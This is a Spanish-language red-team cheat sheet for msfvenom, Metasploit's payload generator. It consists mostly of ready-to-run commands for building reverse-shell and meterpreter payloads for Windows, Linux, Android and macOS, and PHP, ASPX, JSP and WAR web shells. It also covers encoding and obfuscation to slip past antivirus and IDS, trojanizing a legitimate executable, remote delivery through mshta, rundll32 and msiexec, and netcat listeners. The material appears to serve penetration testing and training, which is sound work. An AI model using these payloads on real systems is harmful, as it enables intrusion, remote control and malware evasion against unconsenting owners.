---
aliases:
  - msfvenom
  - Metasploit Payload Generator
tags:
  - type/tool
  - technique/execution
  - technique/defense-evasion
  - tool/msfvenom
  - tool/metasploit
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Payload Engineering]]"
tertiary categories:
  - "[[Payloads]]"
kind: Atomic
linked:
  - "[[Metasploit]]"
  - "[[Reverse Shell]]"
  - "[[AMSI Bypasses]]"
---
# msfvenom

***

## Cheatsheet
^msfvenom

| Target | Comando |
| --- | --- |
| **Windows reverse shell (EXE)** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f exe -o rev.exe` |
| **Windows meterpreter (EXE)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f exe -o met.exe` |
| **Linux reverse shell (ELF)** | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=Y -f elf -o rev.elf` |
| **Bash one-liner** | `msfvenom -p cmd/unix/reverse_bash LHOST=X LPORT=Y` |
| **PHP web shell** | `msfvenom -p php/reverse_php LHOST=X LPORT=Y -f raw -o shell.php` |
| **ASPX** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f aspx -o shell.aspx` |
| **WAR (Tomcat)** | `msfvenom -p java/shell_reverse_tcp LHOST=X LPORT=Y -f war -o shell.war` |
| **Shellcode (C)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f c` |
| **Shellcode (Python)** | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=Y -f python` |
| **List payloads** | `msfvenom -l payloads \| grep windows` |
| **List encoders** | `msfvenom -l encoders` |
| **List formats** | `msfvenom --list formats` |

***

## Concepto

`msfvenom` es el generador de payloads standalone de Metasploit — combina funcionalidades viejas de `msfpayload` + `msfencode`. Genera shellcode, binarios, scripts multi-formato para delivery + encoding.

Sintaxis base:
```
msfvenom -p <payload> [OPTIONS] -f <format> -o <file>
```

## 1. Payloads — staged vs stageless

| Tipo | Nombre | Descripción |
| --- | --- | --- |
| **Staged** | `windows/x64/meterpreter/reverse_tcp` | Stager pequeño → descarga DLL de met → conecta. **2 conexiones**. |
| **Stageless** | `windows/x64/meterpreter_reverse_tcp` | Payload completo en 1 archivo. **1 conexión**. Más grande. |
| **Shell** | `windows/x64/shell_reverse_tcp` | cmd.exe reverse sin meterpreter. Portable. |

Staged tiene `/` como separator, stageless `_`. Regla:
- AV evade → **stageless** (sin segunda descarga sospechosa).
- Networks restrictivas → **staged** (menor payload inicial).

## 2. Opciones comunes

```bash
msfvenom -p PAYLOAD \
  LHOST=<IP>                # reverse callback IP
  LPORT=<port>              # callback port
  RHOST=<IP>                # bind target (para bind shells)
  -f <format>               # exe, elf, raw, c, python, ps1, hex, etc.
  -a <arch>                 # x86, x64, arm, mips
  --platform <os>           # windows, linux, osx, android
  -e <encoder>              # x86/shikata_ga_nai, cmd/base64, etc.
  -i <iterations>           # repeat encoding N times
  -b '\x00\x0a\x0d'         # bad chars to avoid
  --nopsled <size>          # NOP sled length
  -o <output>               # file
  -x <template>             # template EXE para injection
  -k                        # keep original EXE funcional
  --smallest                # minimizar payload
```

## 3. Formatos por target

### Windows

```bash
# EXE standalone
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# EXE-service (installable as Windows service)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f exe-service -o svc.exe

# DLL (LOLBin-loadable)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f dll -o met.dll
# Luego: rundll32 met.dll,0 o regsvr32 /s /u met.dll

# HTA (MSHTA)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f hta-psh -o payload.hta
# Ejecutar: mshta http://atk/payload.hta

# MSI (Windows Installer)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f msi -o setup.msi
# Ejecutar: msiexec /quiet /i setup.msi

# PowerShell (.ps1)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f psh -o payload.ps1

# PowerShell Base64 one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f psh-cmd
```

### Linux

```bash
# ELF binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f elf -o rev.elf

# ELF-SO (shared object for LD_PRELOAD)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f elf-so -o pwn.so

# Python script
msfvenom -p cmd/unix/reverse_python LHOST=X LPORT=4444 -f raw -o rev.py

# Bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=X LPORT=4444

# Perl one-liner
msfvenom -p cmd/unix/reverse_perl LHOST=X LPORT=4444
```

### Web shells

```bash
# PHP
msfvenom -p php/reverse_php LHOST=X LPORT=4444 -f raw -o shell.php
# Add <?php tag manual después

# ASPX (IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=X LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=X LPORT=4444 -f war -o shell.war
```

### Mobile / otros

```bash
# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=X LPORT=4444 -o app.apk

# macOS
msfvenom -p osx/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f macho -o rev.macho
```

## 4. Encoders

```bash
# Shikata Ga Nai — polimórfico, classic (flagged por Defender moderno)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o met.exe

# Multi-encoder chain
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -e x86/countdown -i 5 \
  -f exe -o rev.exe
```

**2025 reality**: encoders NO funcionan para AV evasion moderna. Son solo para:
- Remover bad chars (null bytes en buffer overflows).
- Evade IDS network signatures simples.

Para real AV bypass ver [[AMSI Bypasses]], Shellter, custom loaders.

## 5. Bad chars exclusion

```bash
# Excluir null byte, CR, LF (buffer overflow payloads)
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f c -a x86 --platform windows
```

Output en formato C para paste a exploit:
```c
unsigned char buf[] = "\xd9\xeb\x9b\xd9\x74...";
```

## 6. Template injection (trojan EXE legítimo)

```bash
# Injectar payload en notepad.exe preservando funcionalidad
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe \
  -k \
  -f exe -o plink_trojan.exe

# -k mantiene ejecución original del template
```

Nota: Defender detecta patrón de injection. Útil para targets sin EDR.

## 7. Shellcode para custom loader

```bash
# Formato C array
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f c

# Formato Python
msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f python

# Raw binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f raw -o sc.bin

# Con longitud y arch info
msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f c --smallest
```

## 8. Listener matching

```bash
# Generador
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o met.exe

# Listener match en msfconsole
# use exploit/multi/handler
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# set LHOST 10.10.14.5
# set LPORT 4444
# run

# O netcat si payload es shell (no meterpreter)
nc -lvnp 4444
```

**Payload en venom debe matchear payload en handler exactamente** (staged vs stageless, arch, OS).

## 9. Size constraints (buffer overflow)

```bash
# Ver tamaño
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=4444 -f raw | wc -c

# --smallest
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=4444 --smallest

# Encoded increases size — calcular after encoding:
msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=4444 -e x86/shikata_ga_nai -i 3 -f raw | wc -c
```

## 10. Obfuscation patterns

```bash
# XOR encode (simple eval time)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=4444 -f raw -e x64/xor -i 5

# Base64 cmd payload
msfvenom -p cmd/unix/reverse_bash LHOST=X LPORT=4444 -e cmd/base64

# Python obfuscation manual (post-venom)
msfvenom -p python/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f raw | base64
# Luego decode + run en target
```

## Recursos

- [Rapid7 - msfvenom wiki](https://docs.rapid7.com/metasploit/working-with-payloads)
- [HackTricks - msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
- [OffSec - msfvenom cheatsheet](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [PayloadsAllTheThings - Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

***
